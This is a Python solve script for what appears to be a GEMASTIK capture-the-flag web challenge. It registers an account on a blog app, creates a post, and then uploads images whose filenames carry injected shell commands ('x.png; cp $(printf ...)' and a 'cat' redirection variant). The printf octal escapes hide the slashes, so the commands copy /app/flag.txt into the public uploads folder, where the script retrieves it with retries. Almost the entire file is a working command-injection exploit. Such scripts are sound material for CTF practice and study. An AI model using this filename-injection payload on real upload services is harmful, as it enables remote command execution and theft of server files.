#!/usr/bin/env python3
# blog_solve.py — robust fetch + retries; prints ONLY the flag on success.

import re
import sys
import time
import uuid
import requests

# ---------- CLI TARGET ----------
if len(sys.argv) < 2:
    print(f"Usage: {sys.argv[0]} <ip-or-host> [port]")
    sys.exit(1)

host = sys.argv[1].strip()
port = int(sys.argv[2]) if len(sys.argv) >= 3 else 10000
SCHEME = "http"
TARGET = f"{SCHEME}://{host}:{port}"

# ---------- CREDENTIALS ----------
USERNAME = "cin_auto6"
PASSWORD = "cin123_auto6"

# tiny PNG-like bytes (valid header)
DUMMY_PNG_BYTES = b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR"

session = requests.Session()
session.headers.update({"User-Agent": "blog-solve/1.4"})

ALLOWED_EXT_RE = r"(?:png|jpg|jpeg|bmp)"
FLAG_RE_BYTES = re.compile(rb"GEMASTIK\{[^\}\r\n]{1,200}\}")


def register(u, p):
    r = session.post(
        f"{TARGET}/register", data={"username": u, "password": p}, allow_redirects=True
    )
    print(f"[+] register -> {r.status_code}")
    return r


def login(u, p):
    r = session.post(
        f"{TARGET}/login", data={"username": u, "password": p}, allow_redirects=True
    )
    print(f"[+] login -> {r.status_code}")
    return r


def create_post(title, content, filename_header, blob, mime):
    files = {"image": (filename_header, blob, mime)}
    r = session.post(
        f"{TARGET}/create",
        data={"title": title, "content": content},
        files=files,
        allow_redirects=True,
    )
    print(f"[+] POST /create -> {r.status_code}")
    return r


def get_home(params=None):
    r = session.get(f"{TARGET}/", params=params or {})
    qlog = f"/?q={params.get('q')}" if params and "q" in params else "/"
    print(f"[+] GET {qlog} -> {r.status_code}")
    return r.text if r.status_code == 200 else None


def parse_first_post_from_html(html, require_you=False, title_contains=None):
    if not html:
        return None
    articles = re.split(r"(?=<article\b)", html)
    img_re = re.compile(
        rf'<img\s+src=["\'](/uploads/[0-9a-f]{{64}}\.(?:{ALLOWED_EXT_RE}))["\']', re.I
    )
    id_re = re.compile(r'href=["\']/post/(\d+)["\']', re.I)
    title_re = re.compile(r'<a\s+href=["\']/post/\d+["\'][^>]*>\s*([^<]+)\s*</a>', re.I)
    you_re = re.compile(
        r'<span[^>]*class=["\'][^"\']*badge[^"\']*["\'][^>]*>\s*you\s*</span>', re.I
    )

    for b in articles:
        if 'class="card post-card' not in b:
            continue
        if require_you and not you_re.search(b):
            continue
        m_id = id_re.search(b)
        m_img = img_re.search(b)
        m_title = title_re.search(b)
        if not (m_id and m_img):
            continue
        title_text = m_title.group(1).strip() if m_title else ""
        if title_contains and title_contains not in title_text:
            continue
        return (m_id.group(1), m_img.group(1), title_text)
    return None


def fetch_bytes_once(path):
    # force no-cache to reduce chance of stale content
    r = session.get(
        f"{TARGET}{path}",
        headers={"Cache-Control": "no-cache"},
        allow_redirects=True,
        timeout=8,
    )
    status = r.status_code
    length = len(r.content) if r.ok else 0
    print(f"[+] GET {path} -> {status} (len={length})")
    if status != 200:
        return None
    return r.content


def fetch_bytes_with_retries(path, tries=6, delay=0.3):
    """
    Fetch the resource several times (tries) with short delay; return data if non-empty.
    Also attempt to extract flag bytes on each try.
    """
    last_data = None
    for i in range(tries):
        data = fetch_bytes_once(path)
        if data:
            last_data = data
            m = FLAG_RE_BYTES.search(data)
            if m:
                return data, m.group(0).decode("ascii", "ignore").strip()
        # small jitter/backoff
        time.sleep(delay + (0.05 * i))
    return last_data, None


def extract_flag_from_bytes(data: bytes):
    if not data:
        return None
    m = FLAG_RE_BYTES.search(data)
    if not m:
        return None
    return m.group(0).decode("ascii", "ignore").strip()


def payload_cp(target_filename):
    src = "\\057app\\057flag.txt"
    dst = "\\057app\\057uploads\\057" + target_filename
    return f"x.png; cp $(printf '{src}') $(printf '{dst}') #.png"


def payload_cat(target_filename):
    src = "\\057app\\057flag.txt"
    dst = "\\057app\\057uploads\\057" + target_filename
    return f"x.png; cat $(printf '{src}') > $(printf '{dst}') #.png"


def main():
    print(f"[*] TARGET = {TARGET}")
    register(USERNAME, PASSWORD)
    r_login = login(USERNAME, PASSWORD)
    if r_login.status_code not in (200, 302):
        print("[!] login may have failed; continuing")

    token = str(uuid.uuid4())[:8]
    title = f"exploit-{token}"
    print(f"[*] creating seed post '{title}'")
    create_post(title, "exploit content", "seed.png", DUMMY_PNG_BYTES, "image/png")

    # find our post via search (author-scoped)
    found = None
    for i in range(12):
        time.sleep(0.4 if i else 0)
        html = get_home(params={"q": token})
        found = parse_first_post_from_html(
            html, require_you=False, title_contains=title
        )
        if found:
            break
    if not found:
        for i in range(6):
            time.sleep(0.4)
            html = get_home()
            found = parse_first_post_from_html(
                html, require_you=True, title_contains=title
            )
            if found:
                break
    if not found:
        print("[!] could not find our post; snippet follows:\n", (html or "")[:1600])
        sys.exit(1)

    post_id, img_path, title_text = found
    target_filename = img_path.split("/")[-1]
    print(f"[+] found post id={post_id}, title='{title_text}', image={img_path}")

    # First try: cp payload
    cp_name = payload_cp(target_filename)
    print("[*] sending CP payload filename:")
    print(cp_name)
    create_post("stage2", "stage2", cp_name, DUMMY_PNG_BYTES, "image/png")
    # fetch several times to catch the window where the flag is present
    data, found_flag = fetch_bytes_with_retries(img_path, tries=8, delay=0.25)
    if found_flag:
        # print only the flag on success
        print(found_flag)
        return

    # if cp didn't produce flag in the fetch window, try cat payload
    print("[*] CP didn’t show flag in retries, trying CAT redirection…")
    cat_name = payload_cat(target_filename)
    print(cat_name)
    create_post("stage3", "stage3", cat_name, DUMMY_PNG_BYTES, "image/png")
    data, found_flag = fetch_bytes_with_retries(img_path, tries=8, delay=0.25)
    if found_flag:
        print(found_flag)
        return

    # Final fallback: try one more time with a slightly longer wait
    time.sleep(1.2)
    data = fetch_bytes_once(img_path)
    if data:
        found_flag = extract_flag_from_bytes(data)
        if found_flag:
            print(found_flag, flush=True)
            return
        # for debugging, print a short hex head (not the flag). Keep this to assist troubleshooting.
        print(
            "[!] Exploit attempted but flag not found. Head(64B hex):", data[:64].hex()
        )
    else:
        print("[!] Exploit attempted but image fetch failed (no data).")


if __name__ == "__main__":
    main()
